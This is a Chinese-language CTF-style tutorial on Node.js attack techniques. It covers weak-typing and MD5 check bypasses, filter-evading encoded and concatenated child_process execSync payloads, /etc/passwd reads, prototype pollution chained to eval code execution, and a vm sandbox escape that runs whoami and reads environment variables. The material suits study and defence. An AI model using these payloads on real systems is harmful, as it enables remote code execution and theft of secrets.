# Nodejs 入门

（借鉴总结）

### 1.1 nodejs语言的缺点

#### 1.1.1 大小写特性

toUpperCase()
toLowerCase()

对于toUpperCase(): 字符`"ı"`、`"ſ"` 经过toUpperCase处理后结果为 `"I"`、`"S"`
对于toLowerCase(): 字符`"K"`经过toLowerCase处理后结果为`"k"`(这个K不是K)

#### 1.1.1 弱类型比较

**大小比较**

```js
console.log(1=='1'); //true 
console.log(1>'2'); //false 
console.log('1'<'2'); //true 
console.log(111>'3'); //true 
console.log('111'>'3'); //false 
console.log('asd'>1); //false
```

总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false

*数组的比较：*

```js
console.log([]==[]); //false 
console.log([]>[]); //false
console.log([6,2]>[5]); //true 
console.log([100,2]<'test'); //true 
console.log([1,2]<'2');  //true 
console.log([11,16]<"10"); //false
```

总结：``空数组之间比较永远为false`，``数组之间比较只比较数组间的第一个值``，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，``数组永远小于非数值型字符串``；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较

*还有一些比较特别的相等：*

```js
console.log(null==undefined) // 输出：true 
console.log(null===undefined) // 输出：false 
console.log(NaN==NaN)  // 输出：false 
console.log(NaN===NaN)  // 输出：false
```

**变量拼接**

```js
console.log(5+[6,6]); //56,3 
console.log("5"+6); //56 
console.log("5"+[6,6]); //56,6 
console.log("5"+["6","6"]); //56,6
```

#### 1.1.3 MD5的绕过

```js
a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)
```

a[x]=1&b[x]=2

数组会被解析成`[object Object]`

```js
a={'x':'1'}
b={'x':'2'}

console.log(a+"flag{xxx}")
console.log(b+"flag{xxx}")

a=[1]
b=[2]

console.log(a+"flag{xxx}")
console.log(b+"flag{xxx}")
```

#### 1.1.4 编码绕过

**16进制编码**

```js
console.log("a"==="\x61"); // true
```

**unicode编码**

```js
console.log("\u0061"==="a"); // true
```

**base编码**

```js
eval(Buffer.from('Y29uc29sZS5sb2coImhhaGFoYWhhIik7','base64').toString())
```

## 1.2 危险函数

### 1.2.1 RCE 

Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。

eval(js代码)

```js
1.require('child_process').exec('open /System/Applications/Calculator.app');
2.require('child_process').execSync('open /System/Applications/Calculator.app');
3.global.process.mainModule.constuctor._load('child_process').exec('calc');
```

### 1.2.2 文件读写

#### 一、读取

```js
1. readFile()
require('fs').readFile('/etc/passwd','utf-8',(err,data))=>(
{
    if (err) throw err;
    console.log(data);
});
2.readFileSync()
require('fs').readFileSync('/etc/passwd','utf-8')
```

#### 二、

```js
1.writeFileSync()
require('fs').writeFileSync('input.txt','sss');
2.writeFile()
require('fs').writeFile('input.txt','test',(err)=>{})
```

#### 1.2.3 nodejs危险函数-RCE bypass

**bypass**

原型：

```js
require("child_process").execSync('cat flag.txt')
```

字符拼接：

```js
require("child_process")['exe'%2b'cSync']('cat flag.txt')
//(%2b就是+的url编码)

require('child_process')["exe".concat("cSync")]("open /System/Applications/Calculator.app/")
```

编码绕过：

```js
require("child_process")["\x65\x78\x65\x63\x53\x79\x6e\x63"]('cat flag.txt')
require("child_process")["\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63"]('cat fl001g.txt')
eval(Buffer.from('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==','base64').toString()) //弹计算器
```

模板拼接：

```js
require("child_process")[`${`${`exe`}cSync`}`]('open /System/Applications/Calculator.app/'）
```

其他函数：

```js
require("child_process").exec("sleep 3"); 
require("child_process").execSync("sleep 3"); 
require("child_process").execFile("/bin/sleep",["3"]); *//调用某个可执行文件，在第二个参数传args* 
require("child_process").spawn('sleep', ['3']); 
require("child_process").spawnSync('sleep', ['3']); 
require("child_process").execFileSync('sleep', ['3']);
```

### 1.3 全局变量(global的属性)

#### 1.exports ： 将本模块接口进行导出。另一种表达方式是 module.exports 。

#### 2.require ： 包含本模块导入其他模块的信息。require.main 等同于 module 。

#### 3.module ：指向当前模块的引用，包含当前模块的路径、目录等信息。

#### 4.__filename ：表示当前模块文件的路径（包含模块文件名的全路径）

#### 5.__dirname ：表示当前模块所在文件夹的路径

## 2 nodejs原型链污染

### 2.1 prototype原型

**简介：**

对于使用过基于类的语言 (如 Java 或 C++) 的开发者们来说，JavaScript 实在是有些令人困惑 —— JavaScript 是动态的，本身不提供一个 `class` 的实现。即便是在 ES2015/ES6 中引入了 `class` 关键字，但那也只是语法糖，JavaScript 仍然是基于原型的。

当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 **proto** ）指向它的构造函数的原型对象（**prototype**）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 `null`。根据定义，`null` 没有原型，并作为这个**原型链**中的最后一个环节。

几乎所有 JavaScript 中的对象都是位于原型链顶端的 [`Object`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object) 的实例。

尽管这种原型继承通常被认为是 JavaScript 的弱点之一，但是原型继承模型本身实际上比经典模型更强大。例如，在原型模型的基础上构建经典模型相当简单。

```js
function Foo(name,age){
	this.name=name;
	this.age=age;
}
Object.prototype.toString=function(){
	console.log("I'm "+this.name+" And I'm "+this.age);
}


var fn=new Foo('xiaoming',19);
fn.toString();
console.log(fn.toString===Foo.prototype.__proto__.toString);

console.log(fn.__proto__===Foo.prototype)
console.log(Foo.prototype.__proto__===Object.prototype)
console.log(Object.prototype.__proto__===null)
```



![img](https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/image-20220307155913395.png)



### 2.2 原型链污染原理

在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是**原型链污染**。

```js
// foo是一个简单的JavaScript对象
let foo = {bar: 1}

// foo.bar 此时为1
console.log(foo.bar)

// 修改foo的原型（即Object）
foo.__proto__.bar = 2

// 由于查找顺序的原因，foo.bar仍然是1
console.log(foo.bar)

// 此时再用Object创建一个空的zoo对象
let zoo = {}

// 查看zoo.bar，此时bar为2
console.log(zoo.bar)
```

### 2.3 原型链污染配合RCE

有原型链污染的前提之下，我们可以控制基类的成员，赋值为一串恶意代码，从而造成代码注入。

```js
let foo = {bar: 1}

console.log(foo.bar)

foo.__proto__.bar = 'require(\'child_process\').execSync(\'open /System/Applications/Calculator.app/\');'

console.log(foo.bar)

let zoo = {}

console.log(eval(zoo.bar))
```

2.4 

## 3 vm沙箱逃逸

vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸

逃逸例子：

```js
const vm = require("vm");
const env = vm.runInNewContext(`this.constructor.constructor('return this.process.env')()`);
console.log(env);
```

```js
const vm = require('vm');
const sandbox = {};
const script = new vm.Script("this.constructor.constructor('return this.process.env')()");
const context = vm.createContext(sandbox);
env = script.runInContext(context);
console.log(env);
```

执行以上两个例子之后可以获取到主程序环境中的环境变量（两个例子代码等价）

创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。

因为`this.constructor.constructor`返回的是一个`Function constructor`，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是`return this.process.env`，结果是返回了主程序的环境变量。

配合`chile_process.exec()`就可以执行任意命令了：

```js
const vm = require("vm");
const env = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('whoami').toString()`);
console.log(env);
```